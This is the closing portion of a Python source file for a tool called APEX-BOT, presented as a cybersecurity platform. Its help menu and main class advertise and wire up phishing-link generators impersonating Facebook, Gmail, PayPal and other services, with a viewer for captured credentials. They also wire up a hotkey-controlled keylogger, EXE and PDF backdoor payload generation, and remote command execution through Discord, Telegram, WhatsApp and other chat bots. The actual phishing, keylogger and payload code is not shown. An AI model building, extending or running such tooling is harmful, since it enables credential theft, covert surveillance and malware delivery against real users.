║  ssh_disconnect <conn_id>      - Disconnect
║
║{Colors.BLUE}🚀 TRAFFIC GENERATION:{Colors.RESET}
║  traffic <type> <ip> <dur> [port] [rate] - Generate traffic
║  traffic_types                 - List available types
║  traffic_status                - Show active generators
║  traffic_stop [id]             - Stop generation
║
║{Colors.BLUE}🕷️ NIKTO COMMANDS:{Colors.RESET}
║  nikto <target>                - Web vulnerability scan
║  nikto_full <target>           - Full scan with all tests
║  nikto_ssl <target>            - SSL/TLS scan
║
║{Colors.BLUE}🎣 SOCIAL ENGINEERING:{Colors.RESET}
║  phish_facebook                - Generate Facebook phishing link
║  phish_instagram               - Generate Instagram phishing link
║  phish_twitter                 - Generate Twitter phishing link
║  phish_gmail                   - Generate Gmail phishing link
║  phish_linkedin                - Generate LinkedIn phishing link
║  phish_github                  - Generate GitHub phishing link
║  phish_microsoft               - Generate Microsoft phishing link
║  phish_apple                   - Generate Apple phishing link
║  phish_amazon                  - Generate Amazon phishing link
║  phish_paypal                  - Generate PayPal phishing link
║  phish_start <link_id> [port]  - Start phishing server
║  phish_stop                    - Stop phishing server
║  phish_creds [link_id]         - View captured credentials
║
║{Colors.BLUE}💀 PAYLOAD COMMANDS:{Colors.RESET}
║  payload_gen <type> <name>     - Generate payload (exe/pdf)
║  payload_list [type]           - List payloads
║  payload_exe <name>            - Generate EXE payload
║  payload_pdf <name>            - Generate PDF payload
║
║{Colors.BLUE}🛡️ NETWORK COMMANDS:{Colors.RESET}
║  ping <target> [count]         - Ping a target
║  nmap <target> [options]       - Run nmap scan
║  nmap_quick <target>           - Quick port scan
║  nmap_full <target>            - Full port scan
║  nmap_os <target>              - OS detection scan
║  nmap_service <target>         - Service version detection
║  nmap_udp <target>             - UDP port scan
║  nmap_vuln <target>            - Vulnerability scan
║  nmap_stealth <target>         - Stealth SYN scan
║  curl <url>                    - HTTP request
║  netcat <host> <port> [cmd]    - Connect to host/port
║  traceroute <target>           - Trace network path
║  whois <domain>                - WHOIS lookup
║  dns <domain> [type]           - DNS lookup
║  location <ip>                 - IP geolocation
║  scan <target>                 - Quick port scan
║  quick_scan <target>           - Quick port scan
║  full_scan <target>            - Full port scan
║  comprehensive_scan <target>   - Comprehensive scan
║
║{Colors.BLUE}📊 SYSTEM COMMANDS:{Colors.RESET}
║  status                        - System status
║  history [limit]               - Command history
║  system                        - System information
║  threats [limit]               - Recent threats
║  report                        - Security report
║  clear                         - Clear screen
║  help                          - This help menu
║
║{Colors.ORANGE}💡 EXAMPLES:{Colors.RESET}
║  ping 8.8.8.8
║  nmap_quick 192.168.1.1
║  curl https://example.com
║  traffic icmp 192.168.1.1 10
║  nikto example.com
║  phish_facebook
║  start_keylogger
║  show_keylogs 20
║  add_ip 192.168.1.100
║  show_all_monitored_ip
║  scan_all_ip
║  payload_gen exe backdoor
║  comprehensive_scan 8.8.8.8
║
║{Colors.PURPLE}⚠️  For authorized security testing only{Colors.RESET}
╚══════════════════════════════════════════════════════════════════════════════╝
"""
        return {'success': True, 'output': help_text}

# =====================
# MAIN APPLICATION
# =====================
class ApexBot:
    def __init__(self):
        self.config = ConfigManager()
        self.db = DatabaseManager()
        self.scanner = AdvancedNetworkScanner(self.db)
        self.ip_monitor = IPMonitor(self.db, self.scanner)
        self.ssh = SSHManager(self.db) if PARAMIKO_AVAILABLE else None
        self.traffic = TrafficGeneratorEngine(self.db) if SCAPY_AVAILABLE else None
        self.nikto = NiktoScanner(self.db)
        self.keylogger = AdvancedKeylogger(self.db, self.config) if KEYLOGGER_AVAILABLE else None
        self.payload_gen = PayloadGenerator(self.db, self.config)
        self.handler = CommandHandler(
            self.db, self.ssh, self.traffic, self.nikto,
            self.scanner, self.ip_monitor, self.keylogger,
            self.payload_gen
        )
        
        # Platform bots
        self.discord = DiscordBot(self.handler, self.db)
        self.slack = SlackBot(self.handler, self.db)
        self.telegram = TelegramBot(self.handler, self.db)
        self.signal = SignalBot(self.handler, self.db)
        self.whatsapp = WhatsAppBot(self.handler, self.db)
        self.google_chat = GoogleChatBot(self.handler, self.db)
        self.imessage = iMessageBot(self.handler, self.db)
        self.web = WebDashboard(self.handler, self.db, self.config, self.ip_monitor, self.keylogger)
        
        self.session_id = str(uuid.uuid4())[:8]
        self.running = True
        
        # Add alert callback for IP monitor
        self.ip_monitor.add_alert_callback(self._handle_ip_alert)
    
    def _handle_ip_alert(self, alert: ThreatAlert):
        """Handle IP alerts from monitor"""
        print(f"\n{Colors.RED}🚨 ALERT: {alert.threat_type} from {alert.source_ip} ({alert.severity}){Colors.RESET}")
        print(f"   {alert.description}")
    
    def print_banner(self):
        banner = f"""
{Colors.PURPLE}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.BLUE}        🦅 APEX-BOT v5.0.0 - Ultimate Cybersecurity Platform                 {Colors.PURPLE}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.ORANGE}                                                                           {Colors.PURPLE}║
║{Colors.BLUE}  • Accurate Cyber Defense             • ⌨️ Advanced Keylogger (F10)        {Colors.PURPLE}║
║{Colors.BLUE}  • 🔌 SSH Remote Command Execution   • 🚀 REAL Traffic Generation          {Colors.PURPLE}║
║{Colors.BLUE}  • 🕷️ Nikto Web Scanner              • 🎣 Social Engineering Suite         {Colors.PURPLE}║
║{Colors.BLUE}  • 🛡️ IP Monitoring & Scanning       • 💀 Payload Generation               {Colors.PURPLE}║
║{Colors.BLUE}  • 📱 Multi-Platform Bots            • 🌐 Gradient Web Dashboard           {Colors.PURPLE}║
║{Colors.BLUE}  • Discord | Telegram | WhatsApp     • Signal | Slack | iMessage           {Colors.PURPLE}║
║{Colors.BLUE}  • 📊 Graphical Reports              • 🔒 Firewall Integration             {Colors.PURPLE}║
║{Colors.ORANGE}                                                                           {Colors.PURPLE}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.BLUE}                    🎯 70+ ADVANCED CYBERSECURITY COMMANDS                      {Colors.PURPLE}║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.ORANGE}🦅 Welcome to APEX-BOT v5.0.0 - Your Ultimate Security Assistant{Colors.RESET}
{Colors.ORANGE}💡 Type 'help' to see all commands{Colors.RESET}
{Colors.ORANGE}🌐 Web dashboard available at http://localhost:5000{Colors.RESET}
{Colors.ORANGE}⌨️ Press F10 to start/stop keylogger{Colors.RESET}
{Colors.ORANGE}🛡️ IP Monitor is active - use 'show_all_monitored_ip' to view{Colors.RESET}
"""
        print(banner)
    
    def check_dependencies(self):
        print(f"\n{Colors.PURPLE}🔍 Checking dependencies...{Colors.RESET}")
        
        tools = ['ping', 'nmap', 'curl', 'nc', 'dig', 'traceroute', 'ssh', 'whois', 'nikto']
        for tool in tools:
            if shutil.which(tool):
                print(f"{Colors.BLUE}✅ {tool}{Colors.RESET}")
            else:
                print(f"{Colors.ORANGE}⚠️ {tool} not found{Colors.RESET}")
        
        print(f"{Colors.BLUE}✅ paramiko{Colors.RESET}" if PARAMIKO_AVAILABLE else f"{Colors.ORANGE}⚠️ paramiko not found - SSH disabled{Colors.RESET}")
        print(f"{Colors.BLUE}✅ scapy{Colors.RESET}" if SCAPY_AVAILABLE else f"{Colors.ORANGE}⚠️ scapy not found - advanced traffic disabled{Colors.RESET}")
        print(f"{Colors.BLUE}✅ discord.py{Colors.RESET}" if DISCORD_AVAILABLE else f"{Colors.ORANGE}⚠️ discord.py not found - Discord disabled{Colors.RESET}")
        print(f"{Colors.BLUE}✅ slack-sdk{Colors.RESET}" if SLACK_AVAILABLE else f"{Colors.ORANGE}⚠️ slack-sdk not found - Slack disabled{Colors.RESET}")
        print(f"{Colors.BLUE}✅ flask{Colors.RESET}" if WEB_AVAILABLE else f"{Colors.ORANGE}⚠️ flask not found - Web dashboard disabled{Colors.RESET}")
        print(f"{Colors.BLUE}✅ pynput{Colors.RESET}" if KEYLOGGER_AVAILABLE else f"{Colors.ORANGE}⚠️ pynput not found - Keylogger disabled{Colors.RESET}")
        
        if self.nikto.available:
            print(f"{Colors.BLUE}✅ nikto{Colors.RESET}")
        else:
            print(f"{Colors.ORANGE}⚠️ nikto not found - web scanning disabled{Colors.RESET}")
    
    def setup_platforms(self):
        print(f"\n{Colors.PURPLE}🤖 Platform Bot Configuration{Colors.RESET}")
        print(f"{Colors.PURPLE}{'='*50}{Colors.RESET}")
        
        # Discord
        setup = input(f"{Colors.ORANGE}Configure Discord bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.ORANGE}Enter Discord bot token: {Colors.RESET}").strip()
            prefix = input(f"{Colors.ORANGE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if token:
                self.discord.save_config(token, True, prefix)
                if self.discord.setup():
                    self.discord.start()
                    print(f"{Colors.BLUE}✅ Discord bot starting...{Colors.RESET}")
        
        # Slack
        setup = input(f"{Colors.ORANGE}Configure Slack bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.ORANGE}Enter Slack bot token: {Colors.RESET}").strip()
            channel = input(f"{Colors.ORANGE}Enter channel ID (default: general): {Colors.RESET}").strip() or 'general'
            prefix = input(f"{Colors.ORANGE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if token:
                self.slack.save_config(token, channel, True, prefix)
                if self.slack.setup():
                    self.slack.start()
                    print(f"{Colors.BLUE}✅ Slack bot starting...{Colors.RESET}")
        
        # Telegram
        setup = input(f"{Colors.ORANGE}Configure Telegram bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.ORANGE}Enter Telegram bot token: {Colors.RESET}").strip()
            chat_id = input(f"{Colors.ORANGE}Enter chat ID (optional): {Colors.RESET}").strip()
            prefix = input(f"{Colors.ORANGE}Enter command prefix (default: /): {Colors.RESET}").strip() or '/'
            if token:
                self.telegram.save_config(token, chat_id, True, prefix)
                self.telegram.start()
                print(f"{Colors.BLUE}✅ Telegram bot starting...{Colors.RESET}")
        
        # WhatsApp
        setup = input(f"{Colors.ORANGE}Configure WhatsApp bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            phone = input(f"{Colors.ORANGE}Enter WhatsApp phone number: {Colors.RESET}").strip()
            prefix = input(f"{Colors.ORANGE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if phone:
                self.whatsapp.save_config(phone, True, prefix)
                if self.whatsapp.setup():
                    self.whatsapp.start()
                    print(f"{Colors.BLUE}✅ WhatsApp bot starting...{Colors.RESET}")
        
        # Signal
        setup = input(f"{Colors.ORANGE}Configure Signal bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            phone = input(f"{Colors.ORANGE}Enter Signal phone number: {Colors.RESET}").strip()
            group = input(f"{Colors.ORANGE}Enter group ID (optional): {Colors.RESET}").strip()
            prefix = input(f"{Colors.ORANGE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if phone:
                self.signal.save_config(phone, group, True, prefix)
                self.signal.start()
                print(f"{Colors.BLUE}✅ Signal bot starting...{Colors.RESET}")
        
        # Google Chat
        setup = input(f"{Colors.ORANGE}Configure Google Chat webhook? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            webhook = input(f"{Colors.ORANGE}Enter Google Chat webhook URL: {Colors.RESET}").strip()
            space = input(f"{Colors.ORANGE}Enter space ID (optional): {Colors.RESET}").strip()
            prefix = input(f"{Colors.ORANGE}Enter command prefix (default: /): {Colors.RESET}").strip() or '/'
            if webhook:
                self.google_chat.save_config(webhook, space, True, prefix)
                self.google_chat.start()
                print(f"{Colors.BLUE}✅ Google Chat webhook configured{Colors.RESET}")
        
        # iMessage (macOS only)
        if IMESSAGE_AVAILABLE:
            setup = input(f"{Colors.ORANGE}Configure iMessage bot? (y/n): {Colors.RESET}").strip().lower()
            if setup == 'y':
                numbers = input(f"{Colors.ORANGE}Enter phone numbers (space-separated): {Colors.RESET}").strip().split()
                prefix = input(f"{Colors.ORANGE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
                if numbers:
                    self.imessage.save_config(numbers, True, prefix)
                    if self.imessage.setup():
                        self.imessage.start()
                        print(f"{Colors.BLUE}✅ iMessage bot starting...{Colors.RESET}")
        
        # Web Dashboard
        setup = input(f"{Colors.ORANGE}Enable Web Dashboard? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            port = input(f"{Colors.ORANGE}Enter port (default: 5000): {Colors.RESET}").strip() or '5000'
            host = input(f"{Colors.ORANGE}Enter host (default: 0.0.0.0): {Colors.RESET}").strip() or '0.0.0.0'
            self.config.set('web.enabled', True)
            self.config.set('web.port', int(port))
            self.config.set('web.host', host)
            self.config.save()
            self.web.start()
            print(f"{Colors.BLUE}✅ Web dashboard starting...{Colors.RESET}")
        
        # IP Monitor
        setup = input(f"{Colors.ORANGE}Enable IP Monitor? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            self.ip_monitor.start_monitoring()
            print(f"{Colors.BLUE}✅ IP Monitor started{Colors.RESET}")
    
    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        self.check_dependencies()
        
        # Start IP Monitor by default
        self.ip_monitor.start_monitoring()
        
        setup_platforms = input(f"\n{Colors.ORANGE}Configure platform integrations? (y/n): {Colors.RESET}").strip().lower()
        if setup_platforms == 'y':
            self.setup_platforms()
        
        print(f"\n{Colors.BLUE}✅ APEX-BOT ready! Session: {self.session_id}{Colors.RESET}")
        print(f"{Colors.ORANGE}   Type 'help' for commands{Colors.RESET}")
        print(f"{Colors.ORANGE}   Type 'show_all_monitored_ip' to view monitored IPs{Colors.RESET}")
        print(f"{Colors.ORANGE}   Type 'start_keylogger' to start keylogger (F10 to stop){Colors.RESET}")
        
        while self.running:
            try:
                prompt = f"{Colors.PURPLE}[{Colors.BLUE}{self.session_id}{Colors.PURPLE}]{Colors.ORANGE} 🦅> {Colors.RESET}"
                command = input(prompt).strip()
                
                if not command:
                    continue
                
                if command.lower() == 'exit' or command.lower() == 'quit':
                    self.running = False
                    print(f"\n{Colors.ORANGE}👋 Goodbye!{Colors.RESET}")
                    break
                
                result = self.handler.execute(command)
                
                if result['success']:
                    output = result.get('output', '')
                    if output:
                        print(output)
                    print(f"\n{Colors.BLUE}✅ Done ({result['execution_time']:.2f}s){Colors.RESET}")
                else:
                    print(f"\n{Colors.RED}❌ {result.get('output', 'Unknown error')}{Colors.RESET}")
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.ORANGE}👋 Exiting...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.RED}❌ Error: {e}{Colors.RESET}")
                logger.error(f"Command error: {e}")
        
        # Cleanup
        if self.keylogger and self.keylogger.running:
            self.keylogger.stop_keylogger()
        self.ip_monitor.stop_monitoring()
        self.db.close()
        
        print(f"\n{Colors.BLUE}✅ Shutdown complete.{Colors.RESET}")
        print(f"{Colors.PURPLE}📁 Logs: {LOG_FILE}{Colors.RESET}")
        print(f"{Colors.PURPLE}💾 Database: {DATABASE_FILE}{Colors.RESET}")

def main():
    try:
        print(f"{Colors.PURPLE} Starting APEX-BOT v5.0.0...{Colors.RESET}")
        
        if sys.version_info < (3, 7):
            print(f"{Colors.RED}❌ Python 3.7+ required{Colors.RESET}")
            sys.exit(1)
        
        needs_admin = False
        if platform.system().lower() == 'linux' and os.geteuid() != 0:
            needs_admin = True
        elif platform.system().lower() == 'windows':
            try:
                import ctypes
                if not ctypes.windll.shell32.IsUserAnAdmin():
                    needs_admin = True
            except:
                pass
        
        if needs_admin:
            print(f"{Colors.ORANGE}⚠️ Run with sudo/admin for full functionality{Colors.RESET}")
        
        app = ApexBot()
        app.run()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.ORANGE}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}❌ Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()